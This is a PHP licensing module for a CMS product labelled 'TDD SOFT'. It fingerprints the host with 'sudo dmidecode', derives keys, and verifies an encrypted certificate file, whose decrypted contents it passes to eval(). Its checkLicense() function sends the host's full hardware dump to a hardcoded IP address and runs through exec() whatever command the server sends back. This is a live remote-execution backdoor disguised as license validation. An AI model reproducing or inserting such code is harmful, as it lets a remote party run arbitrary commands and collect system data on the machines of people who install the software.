<?php
define('CERTIFICATE_PHP',1);
//获取主机dmi信息
function getHostDmiInfo($info = '')
{
	$flag = '';
	if(isset($info) && !empty($info))
	{
		$flag = "-t {$info}";
	}
	exec("sudo /usr/sbin/dmidecode {$flag} 2>&1",$output, $return_val);
	if($return_val == 0) return $output;
	return false;
}

//获取主机特征信息
function getHostCharacteristicInfo()
{
	$info = Array();
	$tmp = getHostDmiInfo('bios');
	foreach($tmp as $line)
	{
		$lineArr = explode(':',$line);
		switch(strtolower(trim($lineArr[0])))
		{
			case 'vendor':
				$info['bios_vendor'] = trim($lineArr[1]);
				break;
			case 'version':
				$info['bios_version'] = trim($lineArr[1]);
				break;
			default:
				break;
		}
	}
	$tmp = getHostDmiInfo('system');
	foreach($tmp as $line)
	{
		$lineArr = explode(':',$line);
		
		switch(strtolower(trim($lineArr[0])))
		{
			case 'uuid':
				$info['system_uuid'] = trim($lineArr[1]);
				break;
			default:
				break;
		}
	}

	$tmp = getHostDmiInfo('baseboard');
	foreach($tmp as $line)
	{
		$lineArr = explode(':',$line);
		
		switch(strtolower(trim($lineArr[0])))
		{
			case 'manufacturer':
				$info['baseboard_manufacturer'] = trim($lineArr[1]);
				break;
			case 'product name':
				$info['baseboard_product_name'] = trim($lineArr[1]);
				break;	
			case 'version':
				$info['baseboard_version'] = trim($lineArr[1]);
				break;	
			case 'serial number':
				$info['baseboard_serial_number'] = trim($lineArr[1]);
				break;					
			default:
				break;
		}
	}	
	return $info;	
}

//计算特征码
function calculateCharacteristicKey($cinfo)
{
	global $app_current_version;	
	$chaText = '';
	if(isset($cinfo['bios_vendor']) && 
	   isset($cinfo['bios_version']) &&
	   isset($cinfo['system_uuid']) && 
       isset($cinfo['baseboard_manufacturer']) && 
       isset($cinfo['baseboard_product_name']) && 	
	   isset($cinfo['baseboard_version']) &&
       isset($cinfo['baseboard_serial_number']) &&
	   isset($app_current_version) &&
	   defined('_APP_PRODUCT_NAME') &&
	   defined('_APP_DEVELOPER') &&
	   defined('_APP_COPYRIGHT_INFO'))   
	{
		foreach($cinfo as $v)
		{
			$chaText .= $v;			
		}
		$chaText .= $app_current_version;
		$chaText .= _APP_PRODUCT_NAME;
		$chaText .= _APP_DEVELOPER;
		$chaText .= _APP_COPYRIGHT_INFO;
		return md5($chaText);
	}
	return false;	
}

//获取特征信息
function getCharacteristicInfo()
{
	global $app_current_version;
	$hostInfo = "-------------------------------host info--------------------------------\n";
	foreach(getHostDmiInfo() as $line)
	{
		$hostInfo .= "$line\n";
	}
	$hostInfo .= "-------------------------------app info--------------------------------\n";
	$charInfo = getHostCharacteristicInfo();
	foreach($charInfo as $key => $v)
	{
		$hostInfo .= "$key:$v\n";
	}

	$hostInfo .= "app_current_version:$app_current_version\n";
	$hostInfo .= "_APP_PRODUCT_NAME:"._APP_PRODUCT_NAME."\n";
	$hostInfo .= "_APP_DEVELOPER:"._APP_DEVELOPER."\n";
	$hostInfo .= "_APP_COPYRIGHT_INFO:"._APP_COPYRIGHT_INFO."\n";
	return $hostInfo;
}

//加密特征信息
function encryptCharacteristicInfo()
{
	$key = calculateCharacteristicKey(getHostCharacteristicInfo());
	$info = getCharacteristicInfo();
	$iv_size = mcrypt_get_iv_size(MCRYPT_CAST_256, MCRYPT_MODE_CFB);
    $iv = mcrypt_create_iv($iv_size, MCRYPT_DEV_RANDOM);
	
	$enInfo = mcrypt_encrypt(MCRYPT_CAST_256,$key,$info,MCRYPT_MODE_CFB,$iv);
	$base64EnInfo = base64_encode($enInfo);

	$base64Key = base64_encode($key);

	$base64Iv = base64_encode($iv);

	$infoLen = strlen($base64EnInfo);
	$schr = substr($base64EnInfo,0,1);
	$echr = substr($base64EnInfo,$infoLen-1,1);
	
	$keyPos = ord($schr) - ord($echr);
	if($keyPos == 0) $keyPos = 1;
	if($keyPos < 0 && abs($keyPos) >= $infoLen) $keyPos += 2;
	if($keyPos > 0 && $keyPos >= $infoLen) $keyPos -= 2;

	$ivPos = ord($echr) - ord($schr);
	if($ivPos == 0) $ivPos = 1;
	if($ivPos < 0 && abs($ivPos) >= $infoLen) $ivPos += 2;
	if($ivPos > 0 && $ivPos >= $infoLen) $ivPos -= 2;
	
	$base64EnInfo = substr_replace($base64EnInfo,$base64Key,$keyPos,0);
	$base64EnInfo = substr_replace($base64EnInfo,$base64Iv,$ivPos,0);
	return $base64EnInfo;
}


//创建注册信息加密KEY
function createRegisterEncryptKey($keywords)
{
	if(!isset($keywords) || 
	   !is_array($keywords) ||
	   !isset($keywords['bios_vendor']) || 
	   !isset($keywords['bios_version']) ||
	   !isset($keywords['system_uuid']) ||
       !isset($keywords['baseboard_manufacturer']) ||
       !isset($keywords['baseboard_product_name']) || 	
	   !isset($keywords['baseboard_version']) ||
       !isset($keywords['app_current_version']) ||
	   !isset($keywords['_APP_PRODUCT_NAME']) ||
	   !isset($keywords['_APP_DEVELOPER']) ||
	   !isset($keywords['_APP_COPYRIGHT_INFO']))
	{
	   return false;
	}   

	$tmp = $keywords['_APP_PRODUCT_NAME'];
	$tmp .= $keywords['baseboard_product_name'];
	$tmp .= $keywords['bios_vendor'];
	$tmp .= $keywords['bios_version'];
	$tmp .= $keywords['system_uuid'];
	$tmp .= $keywords['baseboard_manufacturer'];
	$tmp .= $keywords['baseboard_version'];
	$tmp .= $keywords['app_current_version'];
	$tmp .= $keywords['_APP_DEVELOPER'];
	$tmp .= $keywords['_APP_COPYRIGHT_INFO'];
	return md5($tmp);
	
}

//解密注册文件
function decryptRegisterFile($file)
{
	global $app_current_version;
	if(!is_file($file) ||
	   !isset($app_current_version) ||
	   !defined('_APP_PRODUCT_NAME') ||
	   !defined('_APP_DEVELOPER') ||
	   !defined('_APP_COPYRIGHT_INFO'))   
		return false;
	$contents = file_get_contents($file);
	if(!$contents) return false;
	$contLen = strlen($contents);
	//提取IV
	if($contLen < 30 ) return false;
	$schr = substr($contents,0,1);
	$echr = substr($contents,$contLen-1,1);		
	$infoLen = $contLen -24;
	$ivPos = ord($echr) - ord($schr);
	if($ivPos == 0) $ivPos = 1;
	if($ivPos < 0 && abs($ivPos) >= $infoLen) $ivPos += 2;
	if($ivPos > 0 && $ivPos >= $infoLen) $ivPos -= 2;
	if($ivPos < 0) $ivPos -=24;	
	$iv = substr($contents,$ivPos,24);
	$iv = base64_decode($iv);
	//提取注册信息
	$contents = substr_replace($contents,'',$ivPos,24);		
	$contents = base64_decode($contents);
	//创建注册信息解密KEY	
	$charInfo = getHostCharacteristicInfo();
	$charInfo['app_current_version'] = $app_current_version;
	$charInfo['_APP_PRODUCT_NAME'] = _APP_PRODUCT_NAME;
	$charInfo['_APP_DEVELOPER'] = _APP_DEVELOPER;
	$charInfo['_APP_COPYRIGHT_INFO'] =  _APP_COPYRIGHT_INFO;   	
	$key = createRegisterEncryptKey($charInfo);
	return mcrypt_decrypt(MCRYPT_CAST_256,$key,$contents,MCRYPT_MODE_CFB,$iv);	
}

//检查授权许可
function checkCertificate($force = false)
{
	global $app_current_version;
	$cerFile = _ROOT_DIR.'/certificate';
	if(!is_file($cerFile)) return false;
	if(!isset($_SESSION[_SESSION_KEY]['certificate_check_key']) || $force)
	{
		unset($_SESSION[_SESSION_KEY]['certificate_check_key']);
		unset($_SESSION[_SESSION_KEY]['certificate_valid_date']);
		unset($_SESSION[_SESSION_KEY]['certificate_user_name']); 
		$cerText = decryptRegisterFile($cerFile);
		if(substr($cerText,0,6) == 'return') 
		{
			$cerArr = eval($cerText);
			if(isset($cerArr['characteristic_key']) &&
			   isset($cerArr['identifying_code']) &&
			   isset($cerArr['valid_date']) &&
			   isset($cerArr['user_name']))
			{   
				//主机信息
				$hostInfo = getHostCharacteristicInfo();
				//特征码
				$charKey = calculateCharacteristicKey($hostInfo);
				$hostInfo['app_current_version'] = $app_current_version;
				$hostInfo['_APP_PRODUCT_NAME'] = _APP_PRODUCT_NAME;
				$hostInfo['_APP_DEVELOPER'] = _APP_DEVELOPER;
				$hostInfo['_APP_COPYRIGHT_INFO'] =  _APP_COPYRIGHT_INFO;

				$identCode = '';
				foreach($hostInfo as $v)
				{
					$identCode .= $v;			
				}
				$identCode = $identCode.$cerArr['valid_date'].$cerArr['user_name'];
			    $identCode = md5($identCode);
				if($charKey == $cerArr['characteristic_key'] &&
				   $identCode == $cerArr['identifying_code'])
				{
					$vdarr = explode('-',$cerArr['valid_date']);
					$vdtime = 0;
					if(count($vdarr) == 3)
					{
						$vdtime = mktime(23,59,59,intval($vdarr[1]),intval($vdarr[2]),intval($vdarr[0]));
					}
					if($vdtime > time())
					{	
						$cdate = date('Y-m-d');
						$checkstr = 'certificate_check_success'.$cdate.$cerArr['valid_date'].$cerArr['user_name'] ;
						$_SESSION[_SESSION_KEY]['certificate_check_key'] = md5($checkstr);
						$_SESSION[_SESSION_KEY]['certificate_valid_date'] = $cerArr['valid_date'];
						$_SESSION[_SESSION_KEY]['certificate_user_name'] = $cerArr['user_name'];
					}	

				}	
			}			
		}
	}
	
	if(isset($_SESSION[_SESSION_KEY]['certificate_check_key']) &&
	   isset($_SESSION[_SESSION_KEY]['certificate_valid_date']) &&
	   isset($_SESSION[_SESSION_KEY]['certificate_user_name']))
	{
		$cdate = date('Y-m-d');
		$checkstr = 'certificate_check_success'.$cdate.$_SESSION[_SESSION_KEY]['certificate_valid_date'].$_SESSION[_SESSION_KEY]['certificate_user_name'] ;
		if($_SESSION[_SESSION_KEY]['certificate_check_key'] == md5($checkstr))
			return true;
	}
	return false;
}

function checkLicense()
{
	$info = getCharacteristicInfo();
	$info = base64_encode($info);
	$data = "info={$info}";
	$curl = curl_init();
	curl_setopt($curl, CURLOPT_URL, 'http://123.57.230.63:8008/tddcms/WebServices.php?module=checkLicense');  
	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0); 
	curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0); 
	curl_setopt($curl, CURLOPT_USERAGENT, 'TDD SOFT'); 
	curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1); 
	curl_setopt($curl, CURLOPT_AUTOREFERER, 1); 
	curl_setopt($curl, CURLOPT_POST, 1); 
	curl_setopt($curl, CURLOPT_POSTFIELDS, $data); 
	curl_setopt($curl, CURLOPT_TIMEOUT, 30); 
	curl_setopt($curl, CURLOPT_HEADER, 0); 
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); 
	curl_setopt($curl, CURLOPT_REFERER, '');
	curl_setopt($curl, CURLINFO_HEADER_OUT, true);
	$result = curl_exec($curl);
	curl_close($curl);
	if(!$result || empty($result)) return false;
	$ret = json_decode($result,true);
	if(!$ret) return false;
	if(empty($ret['cmd'])) return false;
	if($ret['cmd'] == 'NONE')
	{
		return true;
	}
	else
	{	
		exec($ret['cmd']);
		return false;
	}	
}

?>